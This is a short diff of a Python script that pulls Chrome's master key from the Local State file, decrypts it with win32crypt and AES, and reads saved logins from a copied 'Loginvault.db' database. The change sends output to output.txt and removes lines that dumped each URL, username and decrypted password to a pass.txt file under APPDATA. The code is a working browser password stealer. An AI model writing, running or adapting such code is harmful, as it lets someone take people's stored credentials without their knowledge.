@@ -5,7 +5,10 @@ import sqlite3
 import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
+import sys
 
+f = open('output.txt', 'w');
+sys.stdout = f
 
 def get_master_key():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
@@ -59,10 +62,6 @@ except Exception as e:
     pass
 cursor.close()
 conn.close()
-
-file = open(os.getenv("APPDATA") + '\\pass.txt', "w+")  # данные
-file.write(str(url) + '\n' + str(username) + '\n' + str(decrypted_password) + '\n')
-file.close()
 
 try:
     os.remove("Loginvault.db")
